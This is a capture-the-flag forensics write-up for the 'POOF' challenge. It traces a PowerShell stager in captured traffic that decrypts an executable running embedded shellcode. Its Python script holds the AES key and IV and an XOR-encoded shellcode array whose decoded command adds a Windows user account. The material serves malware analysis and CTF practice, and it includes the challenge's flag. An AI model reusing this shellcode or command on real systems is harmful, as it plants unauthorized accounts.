https://ctftime.org/event/2570

# POOF (Forensics)

## Solution

We are only given a .pcap file.

The HTTP traffic is the most interesting part. There is a .ps1 and a .bin file.

The ps1 file is a bit obsfucated. 

I tried [PowerDecode](https://github.com/Malandrone/PowerDecode), worked pretty well.
The powershell script is just decrypting whatever is on the .bin using CBC.

The iv had the wrong length and truncating it made it work.

After that we get a .exe.

Putting it on [ILSpy](https://github.com/icsharpcode/ILSpy) shows that it is executing some shell code.

And the flag is in plaintext on the shellcode.

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def dec():
    def aes_decrypt_cbc_pkcs7(iv, ciphertext, key):
        cipher = AES.new(key, AES.MODE_CBC, iv)
        plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
        return plaintext

    iv = b"Md33eFa0wNx2Zq5L"
    key = b"sksd89D2G0X9jk2fF1b4S2a7Gh8aVk0L"
    text = bytes.fromhex(open("asdf.bin").read().rstrip())

    decrypted_plaintext = aes_decrypt_cbc_pkcs7(iv, text, key)
    open("a.exe", "wb").write(decrypted_plaintext)


def xorr():
    arr = [129, 149, 255, 125, 125, 125, 29, 244, 152, 76, 189, 25, 246, 45, 77, 246, 47, 113, 246, 47, 105, 246, 15, 85, 114, 202, 55, 91, 76, 130, 209, 65, 28, 1, 127, 81, 93, 188, 178, 112, 124, 186, 159, 143, 47, 42, 246, 47, 109, 246, 55, 65, 246, 49, 108, 5, 158, 53, 124, 172, 44, 246, 36, 93, 124, 174, 246, 52, 101, 158, 71, 52, 246, 73, 246, 124, 171, 76, 130, 209, 188, 178, 112, 124, 186, 69, 157, 8, 139, 126, 0, 133, 70, 0, 89, 8, 153, 37, 246, 37, 89, 124, 174, 27, 246, 113, 54, 246, 37, 97, 124, 174, 246, 121, 246, 124, 173, 244, 57, 89, 89, 38, 38, 28, 36, 39, 44, 130, 157, 34, 34, 39, 246, 111, 150, 240, 32, 23, 124, 240, 248, 207, 125, 125, 125, 45, 21, 76, 246, 18, 250, 130, 168, 198, 141, 200, 223, 43, 21, 219, 232, 192, 224, 130, 168, 65, 123, 1, 119, 253, 134, 157, 8, 120, 198, 58, 110, 15, 18, 23, 125, 46, 130, 168, 30, 16, 25, 93, 82, 30, 93, 19, 24, 9, 93, 8, 14, 24, 15, 93, 17, 24, 26, 20, 9, 8, 14, 24, 15, 93, 8, 18, 27, 9, 30, 9, 27, 6, 42, 73, 14, 34, 76, 41, 34, 47, 78, 28, 17, 17, 4, 34, 28, 51, 34, 52, 16, 13, 17, 73, 19, 9, 66, 66, 0, 93, 82, 28, 25, 25, 93, 82, 4, 125]
    b = 125

    for i in range(0, len(arr)):
        arr[i] ^= b

    print(f"DEBUGPRINT[2]: lab.py:287: bytearray(arr)={bytearray(arr)}")


xorr()
```

## Flag
`uoftctf{W4s_1T_R3ally_aN_Impl4nt??}`

shafouz 2025/01/11
